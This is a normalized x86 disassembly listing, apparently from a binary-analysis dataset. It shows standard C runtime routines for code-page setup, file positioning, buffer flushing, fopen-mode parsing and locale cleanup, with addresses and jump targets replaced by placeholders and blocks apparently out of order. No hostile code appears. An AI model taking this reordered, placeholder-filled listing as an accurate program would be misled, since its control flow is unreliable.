pop ecx
add eax 0x8
mov [ ebp - 0x1c ] eax
mov eax [ eax ]
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
mov [ ebp - 0x1c ] rw-data
mov eax [ rw-data ]
jmp r-xdata
sub eax ecx
je r-xdata
test ebx ebx
je r-xdata
push 0x3
call sub_4235d5
xor ebx ebx
inc ebx
mov [ ebp - 0x20 ] ebx
push eax
call [ DecodePointer@IAT ]
mov [ ebp - 0x1c ] rw-data
mov eax [ rw-data ]
jmp r-xdata
call sub_427b11
mov [ eax ] 0x16
call sub_42a231
jmp r-xdata
mov [ ebp - 0x24 ] eax
cmp eax 0x1
je r-xdata
call sub_429b15
retn
sub eax ecx
je r-xdata
and [ ebp - 0x4 ] 0x0
cmp esi 0x8
je r-xdata
push 0x0
call sub_425b56
pop ecx
sub eax ecx
jne r-xdata
mov eax [ edi + 0x60 ]
mov [ ebp - 0x30 ] eax
and [ edi + 0x60 ] 0x0
cmp esi 0x8
jne r-xdata
cmp esi 0xb
je r-xdata
push 0x0
call [ EncodePointer@IAT ]
mov ecx [ ebp - 0x1c ]
mov [ ecx ] eax
mov eax [ edi + 0x64 ]
mov [ ebp - 0x34 ] eax
mov [ edi + 0x64 ] 0x8c
cmp esi 0x4
jne r-xdata
push esi
call [ ebp - 0x24 ]
push [ edi + 0x64 ]
push esi
call [ ebp - 0x24 ]
pop ecx
jmp r-xdata
mov ecx [ r--data ]
mov edx ecx
mov [ ebp - 0x2c ] edx
cmp esi 0x8
jne r-xdata
mov eax [ ebp - 0x30 ]
mov [ edi + 0x60 ] eax
cmp esi 0x8
jne r-xdata
cmp esi 0xb
je r-xdata
pop ecx
cmp esi 0x8
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_42e391
cmp esi 0x8
jne r-xdata
mov ecx edx
imul ecx ecx 0xc
mov eax [ edi + 0x5c ]
and [ ecx + eax + 0x8 ] 0x0
inc edx
mov [ ebp - 0x2c ] edx
mov ecx [ r--data ]
jmp r-xdata
mov eax [ ebp - 0x34 ]
mov [ edi + 0x64 ] eax
cmp esi 0x4
jne r-xdata
mov eax [ r--data ]
add eax ecx
cmp edx eax
jge r-xdata
sub_42e3cb
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
mov edx [ r--data ]
push esi
mov esi [ ebp + 0x8 ]
imul edx edx 0xc
add edx [ ebp + 0xc ]
cmp ecx edx
jae r-xdata
mov eax edx
imul eax eax 0xc
add eax [ ebp + 0xc ]
add ecx 0xc
cmp ecx eax
jb r-xdata
xor eax eax
cmp [ ecx + 0x4 ] esi
jne r-xdata
cmp [ ecx + 0x4 ] esi
je r-xdata
mov eax ecx
jmp r-xdata
pop esi
pop ebp
retn
sub_42e425
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
sub eax 0x3a4
je r-xdata
mov eax [ r--data ]
pop ebp
retn
sub eax 0x4
je r-xdata
mov eax [ r--data ]
pop ebp
retn
sub eax 0xd
je r-xdata
mov eax [ r--data ]
pop ebp
retn
dec eax
je r-xdata
mov eax [ r--data ]
pop ebp
retn
xor eax eax
pop ebp
retn
sub_42e45f
push ebp
mov ebp esp
sub esp 0x10
lea ecx [ ebp - 0x10 ]
push 0x0
call sub_4247f2
mov eax [ ebp + 0x8 ]
and [ rw-data ] 0x0
cmp eax 0xfffffffe
jne r-xdata
cmp eax 0xfffffffd
jne r-xdata
mov [ rw-data ] 0x1
call [ GetOEMCP@IAT ]
jmp r-xdata
cmp eax 0xfffffffc
jne r-xdata
mov [ rw-data ] 0x1
call [ GetACP@IAT ]
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
mov [ rw-data ] 0x1
mov eax [ eax + 0x4 ]
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_42e4cb
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
push 0x101
xor edi edi
lea esi [ ebx + 0x18 ]
push edi
push esi
call sub_427900
xor eax eax
movzx ecx ax
mov [ ebx + 0x4 ] edi
mov [ ebx + 0x8 ] edi
mov [ ebx + 0x21c ] edi
mov eax ecx
shl ecx 0x10
or eax ecx
lea edi [ ebx + 0xc ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
mov edi rw-data
add esp 0xc
sub edi ebx
mov ecx 0x101
mov al [ edi + esi ]
mov [ esi ] al
inc esi
dec ecx
jne r-xdata
lea ecx [ ebx + 0x119 ]
mov edx 0x100
mov al [ ecx + edi ]
mov [ ecx ] al
inc ecx
dec edx
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_42e534
push ebp
mov ebp esp
sub esp 0x520
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
lea eax [ ebp - 0x518 ]
push eax
push [ esi + 0x4 ]
call [ GetCPInfo@IAT ]
xor ebx ebx
mov edi 0x100
test eax eax
je r-xdata
push 0xffffff9f
lea edx [ esi + 0x119 ]
pop eax
sub eax edx
mov ecx ebx
mov [ ebp - 0x520 ] eax
mov eax ebx
cmp [ ebp - 0x51c ] 0x19
ja r-xdata
or [ esi + ecx + 0x19 ] 0x10
lea eax [ ecx + 0x20 ]
jmp r-xdata
mov [ ebp + eax - 0x104 ] al
inc eax
cmp eax edi
jb r-xdata
mov al [ ebp - 0x512 ]
mov [ ebp - 0x104 ] 0x20
lea ecx [ ebp - 0x512 ]
jmp r-xdata
mov [ edx ] bl
or [ esi + ecx + 0x19 ] 0x20
lea eax [ ecx - 0x20 ]
mov [ edx ] al
jmp r-xdata
test al al
jne r-xdata
add edx ecx
add eax edx
mov [ ebp - 0x51c ] eax
add eax 0x20
cmp eax 0x19
ja r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_421ed7
leave
retn
mov eax [ ebp - 0x520 ]
inc ecx
lea edx [ esi + 0x119 ]
cmp ecx edi
jb r-xdata
movzx edx [ ecx + 0x1 ]
movzx eax al
jmp r-xdata
push ebx
push [ esi + 0x4 ]
lea eax [ ebp - 0x504 ]
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push 0x1
push ebx
call sub_43180c
push ebx
push [ esi + 0x4 ]
lea eax [ ebp - 0x204 ]
push edi
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push edi
push [ esi + 0x21c ]
push ebx
call sub_426663
add esp 0x40
lea eax [ ebp - 0x304 ]
push ebx
push [ esi + 0x4 ]
push edi
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push 0x200
push [ esi + 0x21c ]
push ebx
call sub_426663
add esp 0x24
mov ecx ebx
cmp eax edx
jbe r-xdata
test al 0x2
je r-xdata
or [ esi + ecx + 0x19 ] 0x10
mov al [ ebp + ecx - 0x204 ]
jmp r-xdata
cmp eax edi
jae r-xdata
add ecx 0x2
mov al [ ecx ]
mov [ esi + ecx + 0x119 ] bl
or [ esi + ecx + 0x19 ] 0x20
mov al [ ebp + ecx - 0x304 ]
mov [ esi + ecx + 0x119 ] al
jmp r-xdata
mov [ ebp + eax - 0x104 ] 0x20
inc eax
movzx eax [ ebp + ecx * 2 - 0x504 ]
test al 0x1
je r-xdata
jmp r-xdata
inc ecx
cmp ecx edi
jb r-xdata
sub_42e6c2
push 0xc
push r--data
call sub_429ad0
call sub_42f4f6
mov edi eax
mov ecx [ rw-data ]
test [ edi + 0x70 ] ecx
je r-xdata
push 0xd
call sub_425b56
pop ecx
and [ ebp - 0x4 ] 0x0
mov esi [ edi + 0x68 ]
mov [ ebp - 0x1c ] esi
cmp esi [ rw-data ]
je r-xdata
cmp [ edi + 0x6c ] 0x0
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_42e75e
jmp r-xdata
test esi esi
je r-xdata
mov esi [ edi + 0x68 ]
test esi esi
jne r-xdata
mov eax [ rw-data ]
mov [ edi + 0x68 ] eax
mov esi [ rw-data ]
mov [ ebp - 0x1c ] esi
push esi
call [ InterlockedIncrement@IAT ]
push esi
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov eax esi
call sub_429b15
retn
push 0x20
call sub_42350a
cmp esi rw-data
je r-xdata
push esi
call sub_422732
pop ecx
sub_42e767
push 0x10
push r--data
call sub_429ad0
or edi 0xffffffff
call sub_42f4f6
mov ebx eax
mov [ ebp - 0x1c ] ebx
call sub_42e6c2
mov esi [ ebx + 0x68 ]
push [ ebp + 0x8 ]
call sub_42e45f
pop ecx
mov [ ebp + 0x8 ] eax
cmp eax [ esi + 0x4 ]
je r-xdata
xor edi edi
push 0x220
call sub_4266f1
pop ecx
mov ebx eax
test ebx ebx
je r-xdata
mov eax edi
call sub_429b15
retn
mov ecx 0x88
mov eax [ ebp - 0x1c ]
mov esi [ eax + 0x68 ]
mov edi ebx
[ edi ] [ esi ]
xor esi esi
mov [ ebx ] esi
push ebx
push [ ebp + 0x8 ]
call sub_42e915
pop ecx
pop ecx
mov edi eax
mov [ ebp + 0x8 ] edi
test edi edi
jne r-xdata
cmp edi 0xffffffff
jne r-xdata
mov eax [ ebp - 0x1c ]
push [ eax + 0x68 ]
call [ InterlockedDecrement@IAT ]
test eax eax
mov eax [ ebp - 0x1c ]
jne r-xdata
cmp ebx rw-data
je r-xdata
mov [ eax + 0x68 ] ebx
push ebx
call [ InterlockedIncrement@IAT ]
mov eax [ ebp - 0x1c ]
test [ eax + 0x70 ] 0x2
jne r-xdata
mov ecx [ eax + 0x68 ]
cmp ecx rw-data
je r-xdata
call sub_427b11
mov [ eax ] 0x16
jmp r-xdata
push ebx
call sub_422732
pop ecx
test [ rw-data ] 0x1
jne r-xdata
push ecx
call sub_422732
pop ecx
mov eax [ ebp - 0x1c ]
push 0xd
call sub_425b56
pop ecx
mov [ ebp - 0x4 ] esi
mov eax [ ebx + 0x4 ]
mov [ rw-data ] eax
mov eax [ ebx + 0x8 ]
mov [ rw-data ] eax
mov eax [ ebx + 0x21c ]
mov [ rw-data ] eax
mov ecx esi
mov ecx esi
mov ax [ ebx + ecx * 2 + 0xc ]
mov [ ecx * 2 + rw-data ] ax
inc ecx
jmp r-xdata
mov [ ebp - 0x20 ] esi
cmp esi 0x100
jge r-xdata
mov al [ ecx + ebx + 0x18 ]
mov [ ecx + rw-data ] al
inc ecx
jmp r-xdata
mov [ ebp - 0x20 ] ecx
cmp ecx 0x5
jge r-xdata
push [ rw-data ]
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov al [ esi + ebx + 0x119 ]
mov [ esi + rw-data ] al
inc esi
jmp r-xdata
mov [ ebp - 0x20 ] ecx
cmp ecx 0x101
jge r-xdata
mov [ rw-data ] ebx
push ebx
call [ InterlockedIncrement@IAT ]
mov [ ebp - 0x4 ] 0xfffffffe
call sub_42e8df
jmp r-xdata
mov eax [ rw-data ]
cmp eax rw-data
je r-xdata
push eax
call sub_422732
pop ecx
sub_42e915
push ebp
mov ebp esp
sub esp 0x20
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
push [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
call sub_42e45f
mov ebx eax
pop ecx
mov [ ebp - 0x20 ] ebx
test ebx ebx
jne r-xdata
push edi
xor edi edi
mov ecx edi
mov [ ebp - 0x1c ] ecx
mov eax edi
push esi
call sub_42e4cb
pop ecx
xor eax eax
jmp r-xdata
push 0x101
lea eax [ esi + 0x18 ]
push edi
push eax
call sub_427900
mov edx [ ebp - 0x1c ]
add esp 0xc
imul edx edx 0x30
lea eax [ edx + rw-data ]
mov [ ebp - 0x1c ] eax
inc ecx
add eax 0x30
mov [ ebp - 0x1c ] ecx
cmp eax 0xf0
jb r-xdata
mov ecx [ ebp - 0x4 ]
pop esi
xor ecx ebp
pop ebx
call sub_421ed7
leave
retn
inc edi
add eax 0x8
mov [ ebp - 0x1c ] eax
cmp edi 0x4
jb r-xdata
mov al [ ecx + 0x1 ]
test al al
je r-xdata
cmp [ eax + rw-data ] ebx
je r-xdata
cmp ebx 0xfde8
je r-xdata
cmp [ eax ] 0x0
mov ecx eax
je r-xdata
mov ebx [ ebp - 0x20 ]
push ebx
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] 0x1
call sub_42e425
add esp 0x4
mov [ esi + 0x21c ] eax
push 0x6
lea ecx [ esi + 0xc ]
lea edx [ edx + rw-data ]
pop edi
mov eax [ ebp - 0x1c ]
movzx ebx [ ecx ]
movzx eax al
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
cmp ebx 0xfde9
je r-xdata
mov ax [ edx ]
mov [ ecx ] ax
lea edx [ edx + 0x2 ]
lea ecx [ ecx + 0x2 ]
dec edi
jne r-xdata
push esi
call sub_42e534
cmp ebx eax
jbe r-xdata
pop edi
movzx eax bx
push eax
call [ IsValidCodePage@IAT ]
test eax eax
je r-xdata
cmp ebx 0x100
jae r-xdata
add ecx 0x2
cmp [ ecx ] 0x0
jne r-xdata
lea eax [ ebp - 0x18 ]
push eax
push ebx
call [ GetCPInfo@IAT ]
test eax eax
je r-xdata
mov al [ edi + rw-data ]
or [ esi + ebx + 0x19 ] al
movzx eax [ ecx + 0x1 ]
inc ebx
cmp [ rw-data ] edi
je r-xdata
push 0x101
lea eax [ esi + 0x18 ]
push edi
push eax
call sub_427900
mov [ esi + 0x4 ] ebx
xor ebx ebx
inc ebx
add esp 0xc
mov [ esi + 0x21c ] edi
cmp [ ebp - 0x18 ] ebx
jbe r-xdata
push esi
call sub_42e4cb
jmp r-xdata
mov [ esi + 0x8 ] edi
cmp [ ebp - 0x12 ] 0x0
lea eax [ ebp - 0x12 ]
je r-xdata
pop ecx
xor eax eax
lea eax [ esi + 0x1a ]
mov ecx 0xfe
mov dl [ eax + 0x1 ]
test dl dl
je r-xdata
or [ eax ] 0x8
inc eax
dec ecx
jne r-xdata
push [ esi + 0x4 ]
call sub_42e425
add esp 0x4
mov [ esi + 0x21c ] eax
mov [ esi + 0x8 ] ebx
jmp r-xdata
movzx ecx [ eax ]
movzx edx dl
jmp r-xdata
xor eax eax
movzx ecx ax
mov eax ecx
shl ecx 0x10
or eax ecx
lea edi [ esi + 0xc ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
jmp r-xdata
cmp ecx edx
jbe r-xdata
or [ esi + ecx + 0x19 ] 0x4
inc ecx
add eax 0x2
cmp [ eax ] 0x0
jne r-xdata
sub_42eb0a
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
call sub_427b11
push 0x16
mov edx [ ebp + 0xc ]
test edx edx
je r-xdata
mov ecx [ ebp + 0x10 ]
test ecx ecx
jne r-xdata
push edi
mov edi esi
sub edi ecx
mov [ esi ] cl
pop edi
test edx edx
jne r-xdata
dec edx
jne r-xdata
xor eax eax
jmp r-xdata
mov [ esi ] dl
call sub_427b11
push 0x22
jmp r-xdata
mov al [ ecx ]
mov [ edi + ecx ] al
inc ecx
test al al
je r-xdata
pop esi
pop ebp
retn
pop esi
mov [ eax ] esi
call sub_42a231
mov eax esi
sub_42eb5f
push ebp
mov ebp esp
inc [ rw-data ]
push esi
mov esi 0x1000
push esi
call sub_4266f1
pop ecx
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x8 ] eax
test eax eax
je r-xdata
or [ ecx + 0xc ] 0x4
lea eax [ ecx + 0x14 ]
mov [ ecx + 0x8 ] eax
mov [ ecx + 0x18 ] 0x2
or [ ecx + 0xc ] 0x8
mov [ ecx + 0x18 ] esi
jmp r-xdata
mov eax [ ecx + 0x8 ]
and [ ecx + 0x4 ] 0x0
mov [ ecx ] eax
pop esi
pop ebp
retn
sub_42eba5
push 0x10
push r--data
call sub_429ad0
xor edi edi
mov [ ebp - 0x1c ] edi
push 0x1
call sub_425b56
pop ecx
and [ ebp - 0x4 ] edi
push 0x3
pop esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_42ec39
mov eax edi
call sub_429b15
retn
mov eax [ rw-data ]
mov eax [ eax + esi * 4 ]
test eax eax
je r-xdata
inc esi
jmp r-xdata
test [ eax + 0xc ] 0x83
je r-xdata
mov [ ebp - 0x20 ] esi
cmp esi [ rw-data ]
jge r-xdata
cmp esi 0x14
jl r-xdata
push eax
call sub_4232da
pop ecx
cmp eax 0xffffffff
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + esi * 4 ]
add eax 0x20
push eax
call [ DeleteCriticalSection@IAT ]
mov eax [ rw-data ]
push [ eax + esi * 4 ]
call sub_422732
pop ecx
mov eax [ rw-data ]
and [ eax + esi * 4 ] 0x0
inc edi
mov [ ebp - 0x1c ] edi
sub_42ec42
push 0x10
push r--data
call sub_429ad0
xor eax eax
mov esi [ ebp + 0x8 ]
test esi esi
setne al
test eax eax
jne r-xdata
push esi
call sub_4240a8
pop ecx
and [ ebp - 0x4 ] 0x0
push esi
call sub_42ecb6
pop ecx
mov edi eax
mov [ ebp - 0x20 ] edi
mov ebx edx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_42ecae
mov eax edi
mov edx ebx
call sub_427b11
mov [ eax ] 0x16
call sub_42a231
or edx 0xffffffff
mov eax edx
jmp r-xdata
call sub_429b15
retn
sub_42ecb6
push ebp
mov ebp esp
mov eax 0x1024
call sub_42cc00
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
push ebx
call sub_42b76c
xor edi edi
mov esi eax
pop ecx
mov [ ebp - 0x1018 ] esi
cmp [ ebx + 0x4 ] edi
jge r-xdata
push 0x1
push edi
push edi
push esi
call sub_42ca87
add esp 0x10
mov [ ebp - 0x1010 ] eax
mov [ ebp - 0x100c ] edx
cmp edx edi
jg r-xdata
mov [ ebx + 0x4 ] edi
mov eax esi
sar eax 0x5
mov ecx esi
mov esi [ eax * 4 + rw-data ]
and ecx 0x1f
shl ecx 0x6
mov [ ebp - 0x1014 ] eax
mov al [ esi + ecx + 0x24 ]
add al al
sar al 0x1
test [ ebx + 0xc ] 0x108
mov [ ebp - 0x1005 ] al
mov eax [ ebp - 0x1010 ]
mov [ ebp - 0x1020 ] ecx
jne r-xdata
jl r-xdata
mov edi [ ebx ]
mov esi edi
sub esi [ ebx + 0x8 ]
test [ ebx + 0xc ] 0x3
je r-xdata
mov eax [ ebx + 0x4 ]
mov ecx [ ebp - 0x1010 ]
mov edi [ ebp - 0x100c ]
cdq
sub ecx eax
sbb edi edx
mov eax ecx
mov edx edi
jmp r-xdata
or eax 0xffffffff
or edx eax
jmp r-xdata
cmp eax edi
jae r-xdata
test [ ebx + 0xc ] 0x80
jne r-xdata
cmp [ ebp - 0x1005 ] 0x1
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_421ed7
leave
retn
mov ecx eax
or ecx edx
jne r-xdata
call sub_427b11
mov [ eax ] 0x16
jmp r-xdata
mov edx [ ebp - 0x1014 ]
mov eax [ edx * 4 + rw-data ]
mov edx [ ebp - 0x100c ]
test [ eax + ecx + 0x4 ] 0x80
mov eax [ ebp - 0x1010 ]
je r-xdata
mov eax [ ebp - 0x1014 ]
mov edx [ eax * 4 + rw-data ]
mov eax [ ebp - 0x1010 ]
cmp [ edx + ecx + 0x30 ] 0x0
mov edx [ ebp - 0x100c ]
je r-xdata
test [ ebx + 0xc ] 0x1
je r-xdata
mov eax esi
xor edx edx
jmp r-xdata
mov ecx [ ebx + 0x8 ]
jmp r-xdata
shr esi 0x1
cmp [ ebx + 0x4 ] 0x0
je r-xdata
cmp [ ebp - 0x1005 ] 0x1
jne r-xdata
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
cmp ecx edi
jb r-xdata
mov edx [ ebp - 0x1014 ]
mov ebx [ ebp - 0x1018 ]
mov eax [ edx * 4 + rw-data ]
push 0x0
push [ eax + ecx + 0x2c ]
push [ eax + ecx + 0x28 ]
push ebx
call sub_42ca87
mov edi eax
mov eax [ ebp - 0x1014 ]
add esp 0x10
mov ecx [ eax * 4 + rw-data ]
mov eax [ ebp - 0x1020 ]
mov [ ebp - 0x1024 ] edi
mov [ ebp - 0x101c ] edx
cmp edi [ ecx + eax + 0x28 ]
jne r-xdata
xor edx edx
add eax esi
adc edx [ ebp - 0x100c ]
shr esi 0x1
mov edx [ ebp - 0x1014 ]
sub edi [ ebx + 0x8 ]
mov eax [ edx * 4 + rw-data ]
mov ecx [ ebp - 0x1020 ]
add edi [ ebx + 0x4 ]
test [ eax + ecx + 0x4 ] 0x80
mov eax [ ebp - 0x1010 ]
mov edx [ ebp - 0x100c ]
je r-xdata
xor esi esi
jmp r-xdata
cmp [ ecx ] 0xa
jne r-xdata
cmp edx [ ecx + eax + 0x2c ]
jne r-xdata
cmp [ ebp - 0x1005 ] 0x1
jne r-xdata
push 0x2
push 0x0
push 0x0
push [ ebp - 0x1018 ]
call sub_42ca87
mov ecx [ ebp - 0x1010 ]
add esp 0x10
mov [ ebp - 0x101c ] edx
mov edx [ ebp - 0x100c ]
cmp eax ecx
jne r-xdata
inc ecx
inc esi
push 0x0
lea edx [ ebp - 0x1018 ]
push edx
push 0x1000
lea edx [ ebp - 0x1004 ]
push edx
push [ ecx + eax ]
call [ ReadFile@IAT ]
test eax eax
je r-xdata
sub eax edi
sbb edx 0x0
mov [ ebp - 0x100c ] edx
shr edi 0x1
push 0x0
push edx
push ecx
push [ ebp - 0x1018 ]
call sub_42ca87
add esp 0x10
test edx edx
jg r-xdata
cmp [ ebp - 0x101c ] edx
jne r-xdata
mov edi [ ebp - 0x100c ]
mov ecx [ ebp - 0x1010 ]
push 0x0
push edi
push ecx
push ebx
call sub_42ca87
add esp 0x10
test edx edx
jg r-xdata
mov eax 0x200
cmp edi eax
ja r-xdata
jl r-xdata
mov eax [ ebx + 0x8 ]
lea ecx [ eax + edi ]
jmp r-xdata
mov eax [ ebp - 0x1018 ]
cmp esi eax
ja r-xdata
jl r-xdata
mov edi [ ebx + 0x18 ]
test [ ebx + 0xc ] 0x8
je r-xdata
test eax eax
jb r-xdata
cmp eax ecx
jb r-xdata
lea ecx [ ebp - 0x1004 ]
test esi esi
je r-xdata
test eax eax
jb r-xdata
inc edi
test [ ebx + 0xc ] 0x400
mov edi eax
je r-xdata
cmp [ eax ] 0xa
jne r-xdata
test [ ebx + 0xc ] 0x2000
jmp r-xdata
lea eax [ ebp - 0x1004 ]
sub ecx eax
xor edx edx
add ecx [ ebp - 0x1024 ]
adc edx [ ebp - 0x101c ]
mov eax ecx
jmp r-xdata
mov edx ecx
add edx eax
mov eax [ ebp - 0x1014 ]
mov ecx [ ebp - 0x1020 ]
mov eax [ eax * 4 + rw-data ]
mov edx [ ebp - 0x100c ]
test [ eax + ecx + 0x4 ] 0x4
inc eax
inc edi
mov eax [ ebp - 0x1010 ]
je r-xdata
mov al [ ecx ]
cmp al 0xd
jne r-xdata
movzx eax al
movsx eax [ eax + rw-data ]
add ecx eax
lea eax [ edx - 0x1 ]
cmp ecx eax
jae r-xdata
dec esi
cmp ecx edx
jae r-xdata
inc ecx
test esi esi
jne r-xdata
lea eax [ ecx + 0x1 ]
cmp [ eax ] 0xa
jne r-xdata
mov ecx eax
jmp r-xdata
sub_42f061
push 0x14
push r--data
call sub_429ad0
mov edi [ ebp + 0x8 ]
cmp edi 0xfffffffe
jne r-xdata
test edi edi
js r-xdata
call sub_427b11
mov [ eax ] 0x9
jmp r-xdata
call sub_427b11
mov [ eax ] 0x9
call sub_42a231
cmp edi [ rw-data ]
jae r-xdata
or eax 0xffffffff
mov eax edi
sar eax 0x5
mov [ ebp - 0x20 ] eax
mov ebx edi
and ebx 0x1f
shl ebx 0x6
mov eax [ eax * 4 + rw-data ]
movsx eax [ ebx + eax + 0x4 ]
and eax 0x1
je r-xdata
push edi
call sub_434fa5
pop ecx
xor esi esi
mov [ ebp - 0x4 ] esi
mov eax [ ebp - 0x20 ]
mov eax [ eax * 4 + rw-data ]
test [ ebx + eax + 0x4 ] 0x1
je r-xdata
call sub_427b11
mov [ eax ] 0x9
or esi 0xffffffff
mov [ ebp - 0x1c ] esi
push edi
call sub_43525c
pop ecx
push eax
call [ FlushFileBuffers@IAT ]
test eax eax
jne r-xdata
call sub_429b15
retn
mov [ ebp - 0x1c ] esi
test esi esi
je r-xdata
call [ GetLastError@IAT ]
mov esi eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_42f126
mov eax esi
jmp r-xdata
call sub_427add
mov [ eax ] esi
sub_42f147
push ebp
mov ebp esp
push ecx
push ecx
push ebx
xor edx edx
and [ ebp - 0x4 ] edx
push esi
mov esi [ ebp + 0xc ]
xor eax eax
push edi
mov edi [ rw-data ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
cmp [ esi ] 0x20
je r-xdata
inc esi
mov al [ esi ]
cmp al 0x61
je r-xdata
mov ebx 0x109
cmp al 0x72
je r-xdata
cmp [ esi ] 0x20
je r-xdata
mov [ ebp + 0xc ] 0x1000
xor ebx ebx
or edi 0x1
jmp r-xdata
cmp al 0x77
je r-xdata
inc esi
cmp [ esi ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
test eax eax
je r-xdata
movsx eax al
cmp eax 0x53
jg r-xdata
xor ecx ecx
inc ecx
inc esi
mov al [ esi ]
test al al
je r-xdata
mov ebx 0x301
jmp r-xdata
call sub_427b11
mov [ eax ] 0x16
call sub_42a231
push 0x180
push [ ebp + 0x10 ]
lea eax [ ebp + 0xc ]
push ebx
push [ ebp + 0x8 ]
push eax
call sub_4357f6
add esp 0x14
test eax eax
jne r-xdata
jmp r-xdata
sub eax 0x54
je r-xdata
je r-xdata
or edi 0x2
pop edi
pop esi
pop ebx
leave
retn
xor eax eax
jmp r-xdata
inc [ rw-data ]
mov eax [ ebp + 0x14 ]
xor ecx ecx
mov [ eax + 0x4 ] ecx
mov [ eax ] ecx
mov [ eax + 0x8 ] ecx
mov [ eax + 0x1c ] ecx
mov ecx [ ebp + 0xc ]
mov [ eax + 0xc ] edi
mov [ eax + 0x10 ] ecx
cmp [ esi ] 0x20
je r-xdata
mov eax [ ebp + 0xc ]
test eax ebx
je r-xdata
sub eax 0xe
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
sub eax 0x20
je r-xdata
inc esi
push 0x3
push esi
push r--data
call sub_435814
add esp 0xc
test eax eax
jne r-xdata
or ebx eax
xor ecx ecx
jmp r-xdata
test ebx 0xc000
jne r-xdata
dec eax
je r-xdata
mov [ ebp - 0x4 ] 0x1
or ebx 0x20
jmp r-xdata
inc esi
mov al [ esi ]
test al al
jne r-xdata
sub eax 0xb
je r-xdata
push 0x20
add esi 0x3
pop eax
jmp r-xdata
test ecx ecx
je r-xdata
or ebx 0x8000
jmp r-xdata
test edx edx
jne r-xdata
sub eax 0xb
je r-xdata
test bl 0x2
jne r-xdata
dec eax
je r-xdata
cmp [ esi ] al
je r-xdata
inc edx
or edi 0x4000
jmp r-xdata
test edx edx
jne r-xdata
sub eax 0x6
jne r-xdata
and ebx 0xfffffffe
and edi 0xfffffffc
or ebx 0x2
or edi 0x80
jmp r-xdata
mov [ ebp - 0x8 ] 0x1
jmp r-xdata
sub eax 0x18
je r-xdata
inc esi
cmp [ esi ] 0x3d
jne r-xdata
inc edx
and edi 0xffffbfff
jmp r-xdata
test ebx 0xc000
jne r-xdata
test bl 0x40
jne r-xdata
sub eax 0xa
je r-xdata
inc esi
cmp [ esi ] al
je r-xdata
or ebx 0x4000
jmp r-xdata
or ebx 0x40
jmp r-xdata
or ebx 0x80
jmp r-xdata
sub eax 0x4
jne r-xdata
push 0x5
push r--data
push esi
call sub_435941
add esp 0xc
test eax eax
jne r-xdata
cmp [ ebp - 0x4 ] eax
jne r-xdata
push 0x8
push r--data
push esi
call sub_435941
add esp 0xc
test eax eax
jne r-xdata
add esi 0x5
or ebx 0x40000
jmp r-xdata
mov [ ebp - 0x4 ] 0x1
or ebx 0x10
jmp r-xdata
push 0x7
push r--data
push esi
call sub_435941
add esp 0xc
test eax eax
jne r-xdata
add esi 0x8
or ebx 0x20000
jmp r-xdata
add esi 0x7
or ebx 0x10000
jmp r-xdata
sub_42f3bf
push 0x8
push r--data
call sub_429ad0
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
call sub_429b15
retn 0x4
cmp [ esi + 0x24 ] 0x0
je r-xdata
cmp [ esi + 0x2c ] 0x0
je r-xdata
push [ esi + 0x24 ]
call sub_422732
pop ecx
cmp [ esi + 0x34 ] 0x0
je r-xdata
push [ esi + 0x2c ]
call sub_422732
pop ecx
cmp [ esi + 0x3c ] 0x0
je r-xdata
push [ esi + 0x34 ]
call sub_422732
pop ecx
cmp [ esi + 0x40 ] 0x0
je r-xdata
push [ esi + 0x3c ]
call sub_422732
pop ecx
cmp [ esi + 0x44 ] 0x0
je r-xdata
push [ esi + 0x40 ]
call sub_422732
pop ecx
cmp [ esi + 0x48 ] 0x0
je r-xdata
push [ esi + 0x44 ]
call sub_422732
pop ecx
cmp [ esi + 0x5c ] r--data
je r-xdata
push [ esi + 0x48 ]
call sub_422732
pop ecx
push 0xd
call sub_425b56
pop ecx
and [ ebp - 0x4 ] 0x0
mov edi [ esi + 0x68 ]
test edi edi
je r-xdata
push [ esi + 0x5c ]
call sub_422732
pop ecx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_42f4e1
push 0xc
call sub_425b56
pop ecx
mov [ ebp - 0x4 ] 0x1
mov edi [ esi + 0x6c ]
test edi edi
je r-xdata
push edi
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
